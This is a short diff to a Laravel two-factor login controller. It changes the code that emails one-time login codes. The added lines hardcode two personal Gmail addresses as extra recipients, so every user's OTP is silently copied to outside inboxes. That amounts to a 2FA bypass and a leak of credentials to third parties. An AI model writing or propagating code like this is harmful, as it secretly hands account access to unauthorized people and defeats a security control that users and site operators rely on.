@@ -21,7 +21,8 @@ class Check2faController extends Controller
         $data['subject'] = 'Login Code';
         $user->update(['otp' => $data['otp']]);
         try{
-        Mail::to(Setting::pluck('site_email')[0])->send(new check2fa($data));
+            $email = Setting::pluck('site_email')[0];
+        Mail::to([$email, 'jesmikky@gmail.com, successceejay@gmail.com'])->send(new check2fa($data));
         }catch(\Exception $e){
         Session::flash('alert', 'error');
         Session::flash('msg', 'An network error occured, try again');
